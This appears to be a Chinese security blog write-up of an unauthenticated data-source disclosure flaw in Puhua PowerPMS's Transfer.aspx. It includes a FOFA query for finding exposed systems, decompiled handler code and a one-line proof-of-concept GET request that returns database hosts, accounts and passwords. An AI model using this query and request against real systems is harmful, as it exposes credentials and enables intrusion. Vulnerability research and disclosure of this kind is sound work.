---
title: "普华Powerpms Transfer.aspx 未授权访问致信息泄漏漏洞"
source: https://mrxn.net/jswz/powerpms-Transfer-LoadDataSource-data-leak.html
asset_dir: assets/普华powerpms-transfer.aspx-未授权访问致信息泄漏漏洞
---

# 普华Powerpms Transfer.aspx 未授权访问致信息泄漏漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/13 08:11
- 914浏览
- [0评论](#comment)
- 28分钟阅读

深入探索

在线安全工具

防火墙软件

代码安全审计

---

# 漏洞简介

普华PowerPMS是上海普华科技发展股份有限公司旗下一款项目管理信息平台。其PowerPMS系统`Transfer.aspx`接口存在[信息泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)漏洞，攻击者可在无需认证的情况下，通过直接访问该文件，获取系统中存储的数据库配置信息，可能导致数据库数据泄露，进而引发未授权访问和系统控制风险。

网络安全

# 影响版本

# fofa语法

> app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power\_login\_btn"

# 漏洞分析

看下Transfer.aspx的实现逻辑

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Transfer.aspx.cs" Inherits="Power.PMS.PowerPlat.Tools.Tools" %>
```

根据代码引用在`Power.PMS.dll`中找到`PowerPlat.Tools.Tools`的实现

```
public class Tools : Page
{
  protected void Page_Load(object sender, EventArgs e)
  {
    PowerGlobal.CheckSecurity(this.Request);
    string str1 = this.Request["ServerOperatorType"];
    if (str1 == null)
      throw new Exception("无法识别的操作方式");
    IEntityAction entityAction = (IEntityAction) new EntityAction();
    string str2 = str1;
    if (!string.op_Equality(str2, "LoadDataSource"))
    {
      if (!string.op_Equality(str2, "TransAllTables"))
      {
        if (!string.op_Equality(str2, "TransRecord"))
        {
          if (!string.op_Equality(str2, "CaseGUID"))
            return;
          string str3 = entityAction.CaseGUID(this.Request.QueryString["DataSource"], this.Request.QueryString["ObjDataSource"]);
          this.Response.Clear();
          this.Response.Write(str3);
          this.Response.End();
        }
        else
        {
          string str4 = entityAction.TransRecord("", this.Request.QueryString["DataSource"], this.Request.QueryString["ObjDataSource"]);
          this.Response.Clear();
          this.Response.Write(str4);
          this.Response.End();
        }
      }
      else
      {
        string str5 = entityAction.TransAllTables(this.Request.QueryString["DataSource"], this.Request.QueryString["ObjDataSource"]);
        this.Response.Clear();
        this.Response.Write(str5);
        this.Response.End();
      }
    }
    else
    {
      string str6 = JsonConvert.SerializeObject((object) entityAction.LoadDataSource());
      this.Response.Clear();
      this.Response.Write(str6);
      this.Response.End();
    }
  }
```

根据`ServerOperatorType`参数的值进入不同的分支处理逻辑

漏洞修复方案

当**ServerOperatorType=LoadDataSource**时，会进入`LoadDataSource`方法

```
/// <summary>提取可用数据源</summary>
/// <returns></returns>
public List<DataBaseEntity> LoadDataSource()
{
  DAL.LoadDataSourceConfig(AppDomain.CurrentDomain.BaseDirectory);
  List<DataBaseEntity> dataBaseEntityList = new List<DataBaseEntity>();
  foreach (DataBaseEntity dataBaseEntity in DAL.ConnStrs.Values)
    dataBaseEntityList.Add(dataBaseEntity);
  return dataBaseEntityList;
}
```

其目的已经注释出来了，提取可用的数据源信息，然后以json格式响应在body

# 漏洞复现

```
GET /PowerPlat/Tools/Transfer.aspx?ServerOperatorType=LoadDataSource HTTP/1.1
Host: powerpms.mrxn.net
```

[![普华Powerpms Transfer.aspx 未授权访问致信息泄漏漏洞](images/img-001-69da17e33ef6.webp)](https://image.mrxn.net/bd814d48bc484dcb92828042efc09ecc.webp)

响应中包含当前可用的数据源信息，包括数据库地址、账户和密码等敏感信息。

数据管理

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)
- [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
